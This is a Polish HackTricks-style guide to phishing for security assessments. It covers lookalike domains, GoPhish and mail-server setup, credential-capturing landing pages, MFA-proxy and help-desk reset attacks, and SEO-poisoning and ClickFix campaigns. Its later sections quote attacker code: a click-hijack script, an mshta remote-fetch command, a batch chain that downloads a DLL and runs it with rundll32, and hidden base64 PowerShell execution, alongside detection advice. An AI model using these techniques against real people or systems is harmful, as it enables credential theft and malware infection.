# Metodologia Phishingu

{{#include ../../banners/hacktricks-training.md}}

## Metodologia

1. Przeprowadź rekonesans ofiary
1. Wybierz **domenę ofiary**.
2. Wykonaj podstawową enumerację webową, **wyszukując portale logowania** używane przez ofiarę, i **zdecyduj**, który z nich będziesz **podszywać**.
3. Użyj **OSINT**, aby **znaleźć adresy e-mail**.
2. Przygotuj środowisko
1. **Kup domenę**, której zamierzasz użyć do oceny phishingowej
2. **Skonfiguruj rekordy** związane z usługą e-mail (SPF, DMARC, DKIM, rDNS)
3. Skonfiguruj VPS z użyciem **gophish**
3. Przygotuj kampanię
1. Przygotuj **szablon e-maila**
2. Przygotuj **stronę webową**, aby wykraść dane uwierzytelniające
4. Uruchom kampanię!

## Generowanie podobnych nazw domen lub zakup zaufanej domeny

### Techniki modyfikowania nazwy domeny

- **Keyword**: Nazwa domeny **zawiera** ważne **słowo kluczowe** z oryginalnej domeny (np. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: Zmień **kropkę na łącznik** w subdomenie (np. www-zelster.com).
- **New TLD**: Ta sama domena z użyciem **nowego TLD** (np. zelster.org)
- **Homoglyph**: **Zastępuje** literę w nazwie domeny **literami, które wyglądają podobnie** (np. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Zamienia miejscami dwie litery** w nazwie domeny (np. zelsetr.com).
- **Singularization/Pluralization**: Dodaje lub usuwa „s” na końcu nazwy domeny (np. zeltsers.com).
- **Omission**: **Usuwa jedną** z liter nazwy domeny (np. zelser.com).
- **Repetition:** **Powtarza jedną** z liter nazwy domeny (np. zeltsser.com).
- **Replacement**: Podobnie jak homoglyph, ale jest mniej skryte. Zastępuje jedną z liter w nazwie domeny, na przykład literą znajdującą się blisko oryginalnej litery na klawiaturze (np. zektser.com).
- **Subdomained**: Wprowadza **kropkę** wewnątrz nazwy domeny (np. ze.lster.com).
- **Insertion**: **Wstawia literę** do nazwy domeny (np. zerltser.com).
- **Missing dot**: Dołącza TLD do nazwy domeny (np. zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Istnieje **możliwość, że niektóre przechowywane lub przesyłane bity mogą zostać automatycznie odwrócone** z powodu różnych czynników, takich jak rozbłyski słoneczne, promieniowanie kosmiczne lub błędy sprzętowe.

Gdy ta koncepcja zostanie **zastosowana do żądań DNS**, możliwe jest, że **domena otrzymana przez serwer DNS** nie będzie taka sama jak domena początkowo żądana.

Na przykład pojedyncza modyfikacja bitu w domenie „windows.com” może zmienić ją na „windnws.com”.

Atakujący mogą **wykorzystać to, rejestrując wiele domen wykorzystujących bitflipping**, które są podobne do domeny ofiary. Ich celem jest przekierowanie legalnych użytkowników do własnej infrastruktury.

Więcej informacji znajdziesz na stronie [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Zakup zaufanej domeny

Na stronie [https://www.expireddomains.net/](https://www.expireddomains.net) możesz wyszukać wygasłą domenę, której można użyć.\
Aby upewnić się, że wygasła domena, którą zamierzasz kupić, **ma już dobre SEO**, możesz sprawdzić, jak jest sklasyfikowana w:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Wykrywanie adresów e-mail

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (w 100% darmowe)
- [https://phonebook.cz/](https://phonebook.cz) (w 100% darmowe)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Aby **wykryć więcej** prawidłowych adresów e-mail lub **zweryfikować te, które** zostały już wykryte, możesz sprawdzić, czy możesz przeprowadzić brute force na serwerach SMTP ofiary. [Dowiedz się tutaj, jak weryfikować/wykrywać adresy e-mail](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Ponadto nie zapominaj, że jeśli użytkownicy korzystają z **jakiegokolwiek portalu webowego w celu uzyskania dostępu do poczty**, możesz sprawdzić, czy jest on podatny na **username brute force**, a następnie wykorzystać tę podatność, jeśli jest to możliwe.

## Konfigurowanie GoPhish

### Instalacja

Możesz pobrać je z [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Pobierz i rozpakuj je w `/opt/gophish`, a następnie wykonaj `/opt/gophish/gophish`\
W danych wyjściowych otrzymasz hasło użytkownika administratora dla portu 3333. Uzyskaj więc dostęp do tego portu i użyj tych danych uwierzytelniających, aby zmienić hasło administratora. Może być konieczne przekierowanie tego portu do localhost:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfiguracja

**Konfiguracja certyfikatu TLS**

Przed wykonaniem tego kroku powinieneś **już kupić domenę**, której zamierzasz używać, i musi ona **wskazywać** na **adres IP VPS**, na którym konfigurujesz **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Konfiguracja poczty**

Rozpocznij instalację: `apt-get install postfix`

Następnie dodaj domenę do następujących plików:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Zmień również wartości następujących zmiennych w pliku /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Na koniec zmodyfikuj pliki **`/etc/hostname`** i **`/etc/mailname`**, ustawiając w nich nazwę domeny, a następnie **uruchom ponownie VPS.**

Teraz utwórz **rekord DNS A** dla `mail.<domain>`, wskazujący na **adres IP** VPS, oraz **rekord DNS MX** wskazujący na `mail.<domain>`.

Teraz przetestujmy wysyłanie wiadomości e-mail:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Konfiguracja Gophish**

Zatrzymaj działanie Gophish i skonfigurujmy go.\
Zmodyfikuj `/opt/gophish/config.json` w następujący sposób (zwróć uwagę na użycie https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Konfiguracja usługi gophish**

Aby utworzyć usługę gophish, tak aby można było ją automatycznie uruchamiać i zarządzać nią jako usługą, utwórz plik `/etc/init.d/gophish` z następującą zawartością:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Dokończ konfigurowanie usługi i sprawdź ją, wykonując:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Konfigurowanie serwera pocztowego i domeny

### Poczekaj i zachowaj wiarygodność

Im starsza jest domena, tym mniejsze jest prawdopodobieństwo, że zostanie oznaczona jako spam. Dlatego przed phishing assessment należy odczekać jak najdłużej (co najmniej 1 tydzień). Ponadto, jeśli umieścisz na niej stronę dotyczącą sektora cieszącego się dobrą reputacją, uzyskana reputacja będzie lepsza.

Pamiętaj, że nawet jeśli musisz odczekać tydzień, możesz już teraz dokończyć całą konfigurację.

### Skonfiguruj rekord Reverse DNS (rDNS)

Ustaw rekord rDNS (PTR), który będzie rozwiązywał adres IP VPS do nazwy domeny.

### Rekord Sender Policy Framework (SPF)

Musisz **skonfigurować rekord SPF dla nowej domeny**. Jeśli nie wiesz, czym jest rekord SPF, [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Możesz użyć [https://www.spfwizard.net/](https://www.spfwizard.net), aby wygenerować swoją politykę SPF (użyj adresu IP maszyny VPS).

![Formularz SPF Wizard do generowania rekordu SPF dla domeny phishingowej](<../../images/image (1037).png>)

To jest zawartość, którą należy ustawić w rekordzie TXT domeny:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Rekord Domain-based Message Authentication, Reporting & Conformance (DMARC)

Musisz **skonfigurować rekord DMARC dla nowej domeny**. Jeśli nie wiesz, czym jest rekord DMARC, [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Musisz utworzyć nowy rekord DNS TXT wskazujący na nazwę hosta `_dmarc.<domain>` z następującą zawartością:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Musisz **skonfigurować DKIM dla nowej domeny**. Jeśli nie wiesz, czym jest rekord DMARC, [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Ten tutorial bazuje na: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Musisz połączyć obie wartości B64 generowane przez klucz DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Przetestuj ocenę konfiguracji email

Możesz to zrobić za pomocą [https://www.mail-tester.com/](https://www.mail-tester.com)\
Po prostu otwórz stronę i wyślij email na podany przez nich adres:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Możesz również **sprawdzić konfigurację poczty e-mail**, wysyłając wiadomość na adres `check-auth@verifier.port25.com` i **odczytując odpowiedź** (w tym celu musisz **otworzyć** port **25** i sprawdzić odpowiedź w pliku _/var/mail/root_, jeśli wyślesz wiadomość jako root).\
Sprawdź, czy przechodzisz wszystkie testy:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Możesz również wysłać **wiadomość do Gmaila, nad którym masz kontrolę**, a następnie sprawdzić **nagłówki wiadomości e-mail** w swojej skrzynce odbiorczej Gmaila — w polu nagłówka `Authentication-Results` powinno znajdować się `dkim=pass`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Usuwanie z czarnej listy Spamhaus

Strona [www.mail-tester.com](https://www.mail-tester.com) może wskazać, czy Twoja domena jest blokowana przez Spamhaus. Możesz poprosić o usunięcie swojej domeny/IP pod adresem: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Usuwanie z czarnej listy Microsoft

​​Możesz poprosić o usunięcie swojej domeny/IP pod adresem [https://sender.office.com/](https://sender.office.com).

## Tworzenie i uruchamianie kampanii GoPhish

### Profil wysyłania

- Ustaw **nazwę identyfikującą** profil nadawcy
- Zdecyduj, z którego konta będziesz wysyłać phishingowe wiadomości e-mail. Sugestie: _noreply, support, servicedesk, salesforce..._
- Możesz pozostawić pola nazwy użytkownika i hasła puste, ale upewnij się, że zaznaczono opcję Ignore Certificate Errors

![Tworzenie i uruchamianie kampanii GoPhish - profil wysyłania: możesz pozostawić pola nazwy użytkownika i hasła puste, ale upewnij się, że zaznaczono opcję Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Zaleca się użycie funkcji "**Send Test Email**", aby sprawdzić, czy wszystko działa.\
> Zalecam **wysyłanie testowych wiadomości e-mail na adresy 10min mails**, aby uniknąć umieszczenia na czarnej liście podczas testów.

### Szablon wiadomości e-mail

- Ustaw **nazwę identyfikującą** szablon
- Następnie wpisz **temat** (nic dziwnego, po prostu coś, czego można się spodziewać w zwykłej wiadomości e-mail)
- Upewnij się, że zaznaczono opcję "**Add Tracking Image**"
- Napisz **szablon wiadomości e-mail** (możesz używać zmiennych, jak w poniższym przykładzie):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Zauważ, że **w celu zwiększenia wiarygodności wiadomości e-mail** zaleca się użycie jakiegoś podpisu z wiadomości e-mail od klienta. Sugestie:

- Wyślij wiadomość e-mail na **nieistniejący adres** i sprawdź, czy odpowiedź zawiera podpis.
- Wyszukaj **publiczne adresy e-mail**, takie jak info@ex.com, press@ex.com lub public@ex.com, wyślij na nie wiadomość i poczekaj na odpowiedź.
- Spróbuj skontaktować się z **jakimś poprawnym, znalezionym** adresem e-mail i poczekaj na odpowiedź.

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Email Template umożliwia również **dołączanie plików do wysłania**. Jeśli chcesz także wykradać wyzwania NTLM za pomocą specjalnie spreparowanych plików/dokumentów, [przeczytaj tę stronę](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Strona docelowa

- Wpisz **nazwę**.
- **Wpisz kod HTML** strony internetowej. Pamiętaj, że możesz **importować** strony internetowe.
- Zaznacz **Capture Submitted Data** i **Capture Passwords**.
- Ustaw **przekierowanie**.

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Zwykle konieczna będzie modyfikacja kodu HTML strony i przeprowadzenie kilku testów lokalnie (na przykład przy użyciu serwera Apache), **aż uzyskasz oczekiwane rezultaty**. Następnie wklej ten kod HTML w polu.\
> Pamiętaj, że jeśli potrzebujesz **użyć zasobów statycznych** dla kodu HTML (na przykład stron CSS i JS), możesz zapisać je w _**/opt/gophish/static/endpoint**_, a następnie uzyskać do nich dostęp z poziomu _**/static/\<filename>**_.

> [!TIP]
> W przypadku przekierowania możesz **przekierować użytkowników na prawdziwą główną stronę internetową** ofiary albo na przykład przekierować ich do _/static/migration.html_, umieścić tam **obracający się wskaźnik (**[**https://loading.io/**](https://loading.io)**) na 5 sekund, a następnie poinformować, że proces zakończył się powodzeniem**.

### Użytkownicy i grupy

- Ustaw nazwę.
- **Zaimportuj dane** (pamiętaj, że aby użyć template w tym przykładzie, potrzebujesz imienia, nazwiska i adresu e-mail każdego użytkownika).

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Kampania

Na koniec utwórz kampanię, wybierając nazwę, Email Template, stronę docelową, URL, Sending Profile i grupę. Pamiętaj, że URL będzie linkiem wysłanym ofiarom.

Pamiętaj, że **Sending Profile umożliwia wysłanie testowej wiadomości e-mail, aby sprawdzić, jak będzie wyglądać finalna wiadomość phishingowa**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

Gdy wszystko będzie gotowe, uruchom kampanię!

## Klonowanie strony internetowej

Jeśli z jakiegoś powodu chcesz sklonować stronę internetową, sprawdź następującą stronę:


{{#ref}}
clone-a-website.md
{{#endref}}

## Dokumenty i pliki z backdoorem

W przypadku niektórych ocen phishingowych (głównie dla Red Teams) możesz również chcieć **wysyłać pliki zawierające pewnego rodzaju backdoor** (na przykład C2 albo coś, co wywoła uwierzytelnianie).\
Przykłady znajdziesz na następującej stronie:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Przez proxy MitM

Poprzedni atak jest dość sprytny, ponieważ imitujesz prawdziwą stronę internetową i zbierasz informacje wprowadzane przez użytkownika. Niestety, jeśli użytkownik nie wprowadził poprawnego hasła albo jeśli imitowana aplikacja jest skonfigurowana z 2FA, **informacje te nie pozwolą Ci podszyć się pod zmanipulowanego użytkownika**.

W tym miejscu przydatne są narzędzia takie jak [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) i [**muraena**](https://github.com/muraenateam/muraena). To narzędzie umożliwia przeprowadzenie ataku typu MitM. Zasadniczo atak działa w następujący sposób:

1. **Imitujesz formularz logowania** prawdziwej strony internetowej.
2. Użytkownik **wysyła** swoje **dane uwierzytelniające** na Twoją fałszywą stronę, a narzędzie wysyła je do prawdziwej strony internetowej, **sprawdzając, czy dane uwierzytelniające działają**.
3. Jeśli konto jest skonfigurowane z **2FA**, strona MitM poprosi o jego podanie, a gdy **użytkownik je wprowadzi**, narzędzie wyśle je do prawdziwej strony internetowej.
4. Po uwierzytelnieniu użytkownika Ty, jako atakujący, będziesz mieć **przechwycone dane uwierzytelniające, 2FA, cookie i wszelkie informacje** z każdej interakcji podczas działania narzędzia MitM.

### Przez VNC

Co jeśli zamiast **wysyłać ofiarę na złośliwą stronę** wyglądającą tak samo jak oryginalna, wyślesz ją do **sesji VNC z przeglądarką połączoną z prawdziwą stroną internetową**? Będziesz w stanie obserwować jej działania, wykraść hasło, użyte MFA, cookies...\
Możesz to zrobić za pomocą [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Wykrywanie wykrycia

Oczywiście jednym z najlepszych sposobów sprawdzenia, czy zostałeś wykryty, jest **wyszukanie swojej domeny na listach blokad**. Jeśli się na niej pojawi, oznacza to, że Twoja domena została w jakiś sposób uznana za podejrzaną.\
Jednym z łatwych sposobów sprawdzenia, czy Twoja domena znajduje się na którejś liście blokad, jest użycie [https://malwareworld.com/](https://malwareworld.com).

Istnieją jednak inne sposoby sprawdzenia, czy ofiara **aktywnie poszukuje podejrzanej aktywności phishingowej w internecie**, jak wyjaśniono tutaj:


{{#ref}}
detecting-phising.md
{{#endref}}

Możesz **kupić domenę o bardzo podobnej nazwie** do domeny ofiary **i/lub wygenerować certyfikat** dla **subdomeny** domeny kontrolowanej przez Ciebie, **zawierającej** **słowo kluczowe** z domeny ofiary. Jeśli **ofiara** wykona wobec nich dowolną interakcję **DNS lub HTTP**, będziesz wiedzieć, że **aktywnie wyszukuje** podejrzane domeny i musisz zachować szczególną dyskrecję.<sup>[[2]](#references)</sup>

### Ocena phishingu

Użyj narzędzia [**Phishious** ](https://github.com/Rices/Phishious), aby sprawdzić, czy Twoja wiadomość e-mail trafi do folderu spamu, zostanie zablokowana czy zakończy się powodzeniem.

## Kompromitacja tożsamości wymagająca bezpośredniego kontaktu (reset MFA przez help desk)

Nowoczesne zestawy narzędzi intruzyjnych coraz częściej całkowicie pomijają przynęty e-mailowe i **bezpośrednio atakują proces obsługi zgłoszeń / odzyskiwania tożsamości**, aby ominąć MFA. Atak w pełni wykorzystuje mechanizmy systemu: gdy operator zdobędzie poprawne dane uwierzytelniające, porusza się dalej za pomocą wbudowanych narzędzi administracyjnych — nie jest wymagane żadne malware.<sup>[[6]](#references)</sup>

### Przebieg ataku
1. Rozpoznanie ofiary
* Zbierz dane osobowe i firmowe z LinkedIn, wycieków danych, publicznego GitHub itd.
* Zidentyfikuj tożsamości o wysokiej wartości (kadra kierownicza, IT, finanse) i ustal **dokładny proces help desk** dotyczący resetowania hasła / MFA.
2. Inżynieria społeczna w czasie rzeczywistym
* Zadzwoń, skontaktuj się przez Teams lub napisz na czacie do help desk, podszywając się pod cel (często przy użyciu **sfałszowanego caller ID** lub **sklonowanego głosu**).
* Podaj wcześniej zebrane dane PII, aby przejść weryfikację opartą na wiedzy.
* Przekonaj pracownika do **zresetowania sekretu MFA** albo wykonania **SIM-swap** zarejestrowanego numeru telefonu komórkowego.
3. Natychmiastowe działania po uzyskaniu dostępu (≤60 min w rzeczywistych przypadkach)
* Uzyskaj przyczółek przez dowolny portal web SSO.
* Wykonaj enumerację AD / AzureAD za pomocą wbudowanych narzędzi (bez upuszczania plików binarnych):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Wykonaj ruch boczny za pomocą **WMI**, **PsExec** lub legalnych agentów **RMM**, które są już umieszczone na białej liście w środowisku.

### Wykrywanie i ograniczanie ryzyka
* Traktuj odzyskiwanie tożsamości przez help desk jako **operację uprzywilejowaną** — wymagaj uwierzytelniania step-up i zgody przełożonego.
* Wdróż reguły **Identity Threat Detection & Response (ITDR)** / **UEBA**, które generują alerty dotyczące:
* Zmiany metody MFA oraz uwierzytelnienia z nowego urządzenia / geolokalizacji.
* Natychmiastowego podniesienia uprawnień tego samego podmiotu (user-→-admin).
* Nagrywaj rozmowy z help desk i wymagaj **oddzwonienia na wcześniej zarejestrowany numer** przed wykonaniem jakiegokolwiek resetu.
* Wdróż **Just-In-Time (JIT) / Privileged Access**, aby nowo zresetowane konta **nie dziedziczyły automatycznie tokenów o wysokich uprawnieniach**.

---

## Decepcja na dużą skalę — zatruwanie SEO i kampanie „ClickFix”
Grupy wykorzystujące commodity malware kompensują koszty operacji wymagających bezpośredniego kontaktu za pomocą masowych ataków, które zmieniają **wyszukiwarki i sieci reklamowe w kanał dostarczania**.<sup>[[6]](#references)</sup>

1. **Zatruwanie SEO / malvertising** umieszcza fałszywy wynik, taki jak `chromium-update[.]site`, na szczycie reklam w wynikach wyszukiwania.
2. Ofiara pobiera niewielki **loader pierwszego etapu** (często JS/HTA/ISO). Przykłady zaobserwowane przez Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader eksfiltruje cookies przeglądarki i bazy danych danych uwierzytelniających, a następnie pobiera **cichy loader**, który w czasie rzeczywistym decyduje, czy wdrożyć:
* RAT (np. AsyncRAT, RustDesk)
* ransomware / wiper
* komponent persistence (klucz Run w rejestrze + scheduled task)

### Wskazówki dotyczące hardeningu
* Blokuj nowo zarejestrowane domeny i wymuszaj **Advanced DNS / URL Filtering** zarówno dla *search-ads*, jak i poczty e-mail.
* Ogranicz instalację oprogramowania do podpisanych pakietów MSI / Store, a wykonywanie `HTA`, `ISO`, `VBS` zablokuj za pomocą zasad.
* Monitoruj procesy potomne przeglądarek otwierające instalatory:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Wyszukuj LOLBins często wykorzystywane przez loadery pierwszego etapu (np. `regsvr32`, `curl`, `mshta`).

### Przejęcie kliknięcia przycisku pobierania z przekazaniem do TDS
Niektóre fałszywe portale z oprogramowaniem pozostawiają widoczny atrybut `href` pobierania wskazujący na **prawdziwy URL GitHub/release**, ale przejmują **pierwszą** interakcję użytkownika w JavaScript i zamiast tego przekierowują ofiarę do łańcucha **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Kluczowe cechy:
- Hook zwykle działa w **capture phase** (`true`) na obiekcie `document`, dzięki czemu uruchamia się przed handlerami witryny.
- Chrome często używa `mousedown` zamiast `click`, aby utrzymać redirect powiązany z prawidłowym **user gesture** i zwiększyć skuteczność omijania blokad popupów.
- Niektóre warianty wcześniej otwierają `about:blank` lub emulują kliknięcia `<a target="_blank">`, a dopiero później przypisują URL TDS.
- Limity po stronie przeglądarki często znajdują się w `localStorage`, więc **pierwsze kliknięcie** może prowadzić do malware, a odświeżenia lub ponowne próby mogą kierować do wyglądającego niewinnie widocznego linku.
- TDS może filtrować na podstawie referrera, domeny wejściowej, GEO, browser/device fingerprint, kontroli VPN/datacenter, kontekstu kliknięcia i liczników per-session, przez co powtórzenia analityka są niedeterministyczne.

Pomysły dla obrońców:
- Porównuj **wyświetlany** `href` z **rzeczywistym** celem nawigacji generowanym w momencie kliknięcia.
- Wyszukuj handlery `document.addEventListener(..., true)`, które wywołują zarówno `preventDefault()`, jak i `stopImmediatePropagation()` w połączeniu z `window.open`, `about:blank` lub emulowanymi kliknięciami anchorów.
- Traktuj klastry nowo zarejestrowanych domen oferujących pobieranie software, które wszystkie ładują ten sam stage CloudFront/JS, jako silny sygnał wzorca SEO-poisoning/TDS.

### ClickFix z fałszywych stron weryfikacyjnych + pobieranie LOLBAS wyglądające jak archiwum
Niektóre gałęzie TDS kończą się na fałszywej stronie weryfikacyjnej (w stylu Cloudflare/IUAM), która instruuje ofiarę, aby uruchomiła zaufany plik binarny systemu Windows, taki jak:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Uwagi:
- `mshta.exe` wykonuje **HTA/VBScript na początku odpowiedzi**, nawet jeśli URL udaje archiwum `.7z`; dołączone dane archiwum mogą być czystą zmyłką.
- Kolejne etapy często nadal fałszują typ pliku (`.rtf` dla PowerShell, `.asar` dla Python, ZIP-y z dopełnionymi binariami), a następnie przechodzą do **ręcznego mapowania PE / wykonywania w pamięci**.
- Jeśli analizujesz jeden z tych łańcuchów, zachowaj **sieć + pamięć od pierwszego udanego uruchomienia**: późniejsze odtworzenia mogą pokazywać wyłącznie nieszkodliwą ścieżkę instalatora/SFX albo kończyć się niepowodzeniem, ponieważ wydanie payloadu/klucza było powiązane z pierwotną sesją TDS.

### Tradecraft dostarczania DLL przez ClickFix (fałszywa aktualizacja CERT)
* Przynęta: sklonowany komunikat krajowego CERT z przyciskiem **Update**, który wyświetla instrukcje „naprawy” krok po kroku. Ofiary są instruowane, aby uruchomić batch pobierający DLL i wykonujący ją za pomocą `rundll32`.<sup>[[12]](#references)</sup>
* Zaobserwowany typowy łańcuch batch:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` zapisuje payload w `%TEMP%`, krótka pauza ukrywa opóźnienia sieciowe, a następnie `rundll32` wywołuje eksportowany entrypoint (`notepad`).
* DLL wysyła beacon z identyfikacją hosta i odpytuje C2 co kilka minut. Zdalne zadania są dostarczane jako **zakodowany w base64 PowerShell**, wykonywany w ukryciu i z obejściem zasad:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Zachowuje to elastyczność C2 (serwer może podmieniać zadania bez aktualizowania DLL) i ukrywa okna konsoli. Wyszukuj procesy potomne PowerShell uruchamiane przez `rundll32.exe`, które jednocześnie używają `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* Obrońcy mogą wyszukiwać callbacki HTTP(S) w postaci `...page.php?tynor=<COMPUTER>sss<USER>` oraz 5-minutowe interwały odpytywania po załadowaniu DLL.

---

## Operacje phishingowe wspomagane przez AI
